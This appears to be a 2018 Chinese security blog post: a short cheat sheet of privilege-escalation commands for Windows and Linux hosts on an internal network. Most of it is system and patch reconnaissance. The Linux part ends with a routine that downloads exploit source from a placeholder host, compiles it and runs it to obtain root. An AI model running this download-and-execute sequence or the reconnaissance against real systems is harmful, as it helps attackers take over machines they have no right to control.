---
layout: post
title: "内网提权命令"
date: 2018-09-07
category: 安全
tags: 安全
---

## Windows基础提权命令

	查看系统信息
	systeminfo|findstr /B/C:"OS名称"/C:"OS版本"

	主机名
	Hostname

	环境变量
	Set

	查看用户信息
	Net user
	Net1 user

	查看服务pid号
	Tasklist/svc|find "TermService"
	netstat -ano|find "1488"

	查看系统名
	wmic os get caption

	查看补丁信息
	wmic dfe get Description,HotFixID,InstalledOn|findstr /C:"KB4013389" /C:"KB958644"

	查看当前安装程序
	wmic product get name,version

## Linux提权基础命令

	基础命令：
	uname -an
	id
	pwd
	cat /etc/issue

	套路：
	wget http://exp/exp.c
	gcc -o exp exp.c
	chmod +x exp
	./exp
	...到root

## LINK

[SecWikiGithub](https://github.com/SecWiki)  
[SecWiki](https://www.sec-wiki.com/)  